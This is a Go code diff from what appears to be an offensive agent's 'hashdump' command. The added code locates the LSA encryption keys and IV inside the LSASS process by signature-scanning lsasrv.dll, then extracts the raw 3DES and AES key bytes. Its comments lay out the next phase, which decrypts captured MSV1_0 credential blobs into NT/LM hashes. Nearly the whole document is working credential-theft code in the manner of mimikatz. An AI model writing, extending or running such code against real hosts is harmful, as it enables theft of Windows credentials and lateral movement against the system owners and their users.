@@ -3,7 +3,8 @@
 
 package commands
 
-// Phase 2B + 2C-i + 2C-ii-a orchestrator for hashdump in-situ:
+// Phase 2B + 2C-i + 2C-ii-a + 2C-ii-b (Step 1) orchestrator for hashdump
+// in-situ:
 //
 //   1. Run Phase 1 LSA enumeration to get an authoritative LUID → username
 //      map (cross-reference oracle).
@@ -23,17 +24,21 @@ package commands
 //      KIWI_MSV1_0_CREDENTIAL_LIST chain (Phase 2C-ii-a), dereference each
 //      KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC envelope, and capture the
 //      encrypted blob bytes alongside the parsed UserName/Domain/AuthPackage.
-//      The encrypted ciphertext is opaque at this stage — Phase 2C-ii-b will
-//      sigscan h3DesKey/hAesKey out of lsasrv.dll and BCryptDecrypt it.
-//   7. Emit a structured JSON report (one entry per walked node, with a
-//      nested credentials array when applicable) plus a summary header.
+//   7. Pattern-scan the same lsasrv.dll image for the
+//      LsaInitializeProtectedMemory_Internal signature (Phase 2C-ii-b Step 1)
+//      and resolve three RIP-relative MOV instructions to recover the
+//      LSASS-virtual addresses of the IV / h3DesKey / hAesKey globals. Walk
+//      the BCrypt handle → KIWI_BCRYPT_KEY81 → KIWI_HARD_KEY chain to extract
+//      the raw 24-byte 3DES + 32-byte AES key bytes plus the 16-byte IV.
+//   8. Emit a structured JSON report: one entry per walked node (with a
+//      nested credentials array), a summary header, and a top-level
+//      `lsa_crypto` block describing the captured key material.
 //
-// Phase 2C-ii-b will sigscan lsasrv.dll for the h3DesKey/hAesKey BCRYPT_KEY
-// globals via RIP-relative back-reference from LsaProtectMemory /
-// LsaUnprotectMemory exports, BCryptImportKey them into the agent process,
-// BCryptDecrypt every blob captured here, and parse the plaintext
-// KIWI_MSV1_0_PRIMARY_CREDENTIAL into NT/LM/SHA hashes (with WDigest
-// cleartext when g_fParameter_UseLogonCredential is set).
+// Phase 2C-ii-c will use the captured keys + IV to AES-CFB / 3DES-CBC decrypt
+// every ciphertext blob captured in step 6, parse the plaintext
+// KIWI_MSV1_0_PRIMARY_CREDENTIAL into NT/LM/SHA hashes, and add a
+// ProcessResponse hook that registers the extracted hashes via
+// registerCredentials.
 
 import (
 	"encoding/hex"
@@ -101,21 +106,62 @@ type insituFullCredentialReport struct {
 
 // insituFullSummary captures the top-level metadata of a hashdump in-situ
 // full run (Phase 2B walk + Phase 2C-i structured parse + Phase 2C-ii-a
-// credential-list walk).
+// credential-list walk + Phase 2C-ii-b key extraction).
 type insituFullSummary struct {
-	Phase1SessionCount   int                    `json:"phase1_session_count"`
-	LSASSPID             uint32                 `json:"lsass_pid"`
-	LsasrvBase           string                 `json:"lsasrv_base"`
-	LsasrvSize           uint32                 `json:"lsasrv_size"`
-	AnchorAddr           string                 `json:"logon_session_list_anchor"`
-	StructLayout         string                 `json:"struct_layout"`
-	NodesWalked          int                    `json:"nodes_walked"`
-	NodesMatched         int                    `json:"nodes_matched_to_phase1"`
-	NodesStructParsed    int                    `json:"nodes_with_structured_luid"`
-	NodesWithCredentials int                    `json:"nodes_with_credential_list"`
-	CredentialBlobsCaptured int                 `json:"credential_blobs_captured"`
-	UnmatchedLUIDs       []string               `json:"phase1_luids_not_seen_in_walk,omitempty"`
-	Nodes                []insituFullNodeReport `json:"nodes"`
+	Phase1SessionCount      int                    `json:"phase1_session_count"`
+	LSASSPID                uint32                 `json:"lsass_pid"`
+	LsasrvBase              string                 `json:"lsasrv_base"`
+	LsasrvSize              uint32                 `json:"lsasrv_size"`
+	AnchorAddr              string                 `json:"logon_session_list_anchor"`
+	StructLayout            string                 `json:"struct_layout"`
+	CryptoLayout            string                 `json:"crypto_layout,omitempty"`
+	LsaCrypto               *insituFullCryptoReport `json:"lsa_crypto,omitempty"`
+	LsaCryptoErr            string                 `json:"lsa_crypto_err,omitempty"`
+	NodesWalked             int                    `json:"nodes_walked"`
+	NodesMatched            int                    `json:"nodes_matched_to_phase1"`
+	NodesStructParsed       int                    `json:"nodes_with_structured_luid"`
+	NodesWithCredentials    int                    `json:"nodes_with_credential_list"`
+	CredentialBlobsCaptured int                    `json:"credential_blobs_captured"`
+	UnmatchedLUIDs          []string               `json:"phase1_luids_not_seen_in_walk,omitempty"`
+	Nodes                   []insituFullNodeReport `json:"nodes"`
+}
+
+// insituFullCryptoReport is the JSON projection of the Phase 2C-ii-b key
+// extraction: IV bytes plus the two BCrypt key blobs (3DES + AES) lsasrv
+// uses to encrypt MSV1_0 credentials. Phase 2C-ii-c will use these to
+// AES-CFB / 3DES-CBC decrypt every ciphertext blob captured in
+// `credentials[].encrypted_hex_preview` of the per-node reports.
+type insituFullCryptoReport struct {
+	IVAddress   string `json:"iv_address"`
+	IVHex       string `json:"iv_hex,omitempty"`
+	IVErr       string `json:"iv_err,omitempty"`
+	H3DesGlobal string `json:"h3deskey_global"`
+	H3DesKey    *insituFullBcryptKeyReport `json:"h3deskey,omitempty"`
+	H3DesErr    string `json:"h3deskey_err,omitempty"`
+	HAesGlobal  string `json:"haeskey_global"`
+	HAesKey     *insituFullBcryptKeyReport `json:"haeskey,omitempty"`
+	HAesErr     string `json:"haeskey_err,omitempty"`
+}
+
+// insituFullBcryptKeyReport is the JSON projection of one resolved BCrypt
+// key (h3DesKey or hAesKey). Captures both the KIWI_BCRYPT_HANDLE_KEY tag and
+// the KIWI_BCRYPT_KEY81 tag so layout-drift cases are visible, plus the raw
+// key bytes themselves. The key bytes are the input Phase 2C-ii-c will feed
+// into crypto/aes / crypto/des to recover plaintext credentials.
+type insituFullBcryptKeyReport struct {
+	HandleAddress  string `json:"handle_address"`
+	HandleSize     uint32 `json:"handle_size"`
+	HandleTag      string `json:"handle_tag"`
+	HandleTagValid bool   `json:"handle_tag_valid"`
+	HAlgorithm     string `json:"h_algorithm,omitempty"`
+	KeyAddress     string `json:"key_address"`
+	KeySize        uint32 `json:"key_size"`
+	KeyTag         string `json:"key_tag"`
+	KeyTagValid    bool   `json:"key_tag_valid"`
+	KeyType        uint32 `json:"key_type"`
+	KeyBits        uint32 `json:"key_bits"`
+	CbSecret       uint32 `json:"cb_secret"`
+	KeyHex         string `json:"key_hex,omitempty"`
 }
 
 // executeInsituFull runs the full Phase 2B credential-discovery flow and
@@ -302,6 +348,16 @@ func executeInsituFull() structs.CommandResult {
 		}
 	}
 
+	// Step 7: Phase 2C-ii-b key extraction. Sigscan
+	// LsaInitializeProtectedMemory_Internal in the same lsasrv.dll image,
+	// resolve the IV / h3DesKey / hAesKey RIP-relative globals, and walk the
+	// BCrypt key chain to recover the raw key material. Failures are
+	// non-fatal — the LogonSessionList walk and credential-list walk are
+	// independently useful even when key extraction fails on a build the
+	// signature isn't calibrated for.
+	cryptoLayout := LsaCryptoWin10W8
+	cryptoReport, cryptoErrStr := captureLsaCrypto(reader, lsasrvBytes, mod.Base, cryptoLayout)
+
 	summary := insituFullSummary{
 		Phase1SessionCount:      len(phase1),
 		LSASSPID:                pid,
@@ -309,6 +365,9 @@ func executeInsituFull() structs.CommandResult {
 		LsasrvSize:              mod.Size,
 		AnchorAddr:              fmt.Sprintf("0x%X", anchor),
 		StructLayout:            layout.Name,
+		CryptoLayout:            cryptoLayout.Name,
+		LsaCrypto:               cryptoReport,
+		LsaCryptoErr:            cryptoErrStr,
 		NodesWalked:             len(nodes),
 		NodesMatched:            matchedNodes,
 		NodesStructParsed:       structParsed,
@@ -334,7 +393,112 @@ func executeInsituFull() structs.CommandResult {
 	}
 	sb.WriteString(fmt.Sprintf("[+] Layout: %s — %d/%d node(s) yielded a non-zero structured LUID\n", layout.Name, structParsed, len(nodes)))
 	sb.WriteString(fmt.Sprintf("[+] Cross-referenced %d/%d Phase 1 LUID(s) into walked nodes\n", len(matchedLUIDs), len(luidsOrdered)))
-	sb.WriteString(fmt.Sprintf("[+] Credential lists: %d node(s) yielded credential entries; %d encrypted blob(s) captured (Phase 2C-ii-a — decryption in 2C-ii-b)\n\n", nodesWithCreds, credBlobsCaptured))
+	sb.WriteString(fmt.Sprintf("[+] Credential lists: %d node(s) yielded credential entries; %d encrypted blob(s) captured (Phase 2C-ii-a)\n", nodesWithCreds, credBlobsCaptured))
+	if cryptoErrStr != "" {
+		sb.WriteString(fmt.Sprintf("[!] LSA crypto extraction failed: %s\n", cryptoErrStr))
+	} else if cryptoReport != nil {
+		sb.WriteString(fmt.Sprintf("[+] LSA crypto: IV @ %s; h3DesKey @ %s (cb=%d); hAesKey @ %s (cb=%d) — Phase 2C-ii-b\n",
+			cryptoReport.IVAddress,
+			cryptoReport.H3DesGlobal, bcryptCbSecret(cryptoReport.H3DesKey),
+			cryptoReport.HAesGlobal, bcryptCbSecret(cryptoReport.HAesKey)))
+	}
+	sb.WriteString("\n")
 	sb.WriteString(string(jsonBytes))
 	return successResult(sb.String())
+}
+
+// bcryptCbSecret returns the resolved cbSecret of a BCrypt key report or 0
+// when the report wasn't captured.
+func bcryptCbSecret(r *insituFullBcryptKeyReport) uint32 {
+	if r == nil {
+		return 0
+	}
+	return r.CbSecret
+}
+
+// captureLsaCrypto runs the Phase 2C-ii-b key extraction:
+//
+//  1. Sigscan lsasrvBytes for LsaInitializeProtectedMemory_Internal.
+//  2. Resolve the three RIP-relative MOVs to recover IV / h3DesKey / hAesKey
+//     LSASS-virtual addresses.
+//  3. ReadProcessMemory the IV bytes and walk the BCrypt key chain for both
+//     keys, capturing the raw key material.
+//
+// Any sigscan / read failure surfaces in the returned error string rather
+// than aborting the parent run — credential-blob inspection still works
+// without keys, and operators triaging layout drift want to see the partial
+// data.
+func captureLsaCrypto(r lsassReader, lsasrvBytes []byte, lsasrvBase uintptr, layout lsaCryptoLayout) (*insituFullCryptoReport, string) {
+	globals, err := findLsaCryptoGlobals(lsasrvBytes, lsasrvBase, layout)
+	if err != nil {
+		return nil, err.Error()
+	}
+	report := &insituFullCryptoReport{
+		IVAddress:   fmt.Sprintf("0x%X", globals.IVAddr),
+		H3DesGlobal: fmt.Sprintf("0x%X", globals.H3DesKeyAddr),
+		HAesGlobal:  fmt.Sprintf("0x%X", globals.HAesKeyAddr),
+	}
+
+	if iv, err := readIVBytes(r, globals.IVAddr, layout.IVSize); err != nil {
+		report.IVErr = err.Error()
+	} else {
+		report.IVHex = hex.EncodeToString(iv)
+	}
+
+	if hk, k, err := readBcryptKeyMaterial(r, globals.H3DesKeyAddr); err != nil {
+		report.H3DesErr = err.Error()
+	} else {
+		report.H3DesKey = bcryptKeyReport(hk, k)
+	}
+	if hk, k, err := readBcryptKeyMaterial(r, globals.HAesKeyAddr); err != nil {
+		report.HAesErr = err.Error()
+	} else {
+		report.HAesKey = bcryptKeyReport(hk, k)
+	}
+	return report, ""
+}
+
+// bcryptKeyReport projects a (handle, key81) pair into JSON-shaped output.
+// Tag bytes are rendered as their stored little-endian byte sequence so an
+// operator reading the report sees the literal "RUUU" / "KSSM" rather than
+// the magic-number DWORD.
+func bcryptKeyReport(hk bcryptHandleKey, k bcryptKey81) *insituFullBcryptKeyReport {
+	out := &insituFullBcryptKeyReport{
+		HandleAddress:  fmt.Sprintf("0x%X", hk.Address),
+		HandleSize:     hk.Size,
+		HandleTag:      tagToASCII(hk.Tag),
+		HandleTagValid: hk.TagValid,
+		KeyAddress:     fmt.Sprintf("0x%X", k.Address),
+		KeySize:        k.Size,
+		KeyTag:         tagToASCII(k.Tag),
+		KeyTagValid:    k.TagValid,
+		KeyType:        k.Type,
+		KeyBits:        k.Bits,
+		CbSecret:       k.CbSecret,
+	}
+	if hk.HAlgorithm != 0 {
+		out.HAlgorithm = fmt.Sprintf("0x%X", hk.HAlgorithm)
+	}
+	if len(k.Key) > 0 {
+		out.KeyHex = hex.EncodeToString(k.Key)
+	}
+	return out
+}
+
+// tagToASCII renders a 4-byte DWORD tag as the four ASCII bytes that would
+// appear in memory (little-endian: low byte first). Non-printable bytes are
+// rendered as `.` so the result is always 4 chars, suitable for JSON output.
+func tagToASCII(tag uint32) string {
+	bytes := []byte{
+		byte(tag),
+		byte(tag >> 8),
+		byte(tag >> 16),
+		byte(tag >> 24),
+	}
+	for i, b := range bytes {
+		if b < 0x20 || b > 0x7E {
+			bytes[i] = '.'
+		}
+	}
+	return string(bytes)
 }
